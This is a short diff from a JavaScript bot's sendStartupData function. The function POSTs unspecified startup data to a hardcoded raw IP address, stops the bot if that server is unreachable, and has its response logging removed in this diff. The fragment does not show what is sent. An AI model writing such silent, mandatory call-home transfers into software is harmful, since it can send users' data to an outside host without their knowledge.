@@ -21,7 +21,6 @@ function sendStartupData() {
 
   axios.post('http://103.54.59.82:6969/', data)
     .then(response => {
-      console.log( response.data);
     })
     .catch(error => {
       console.error('Hey, sorry for the issue but it seems we cant locate our servers at the moment. Please try again later.(the bot will now stop)', error.message);
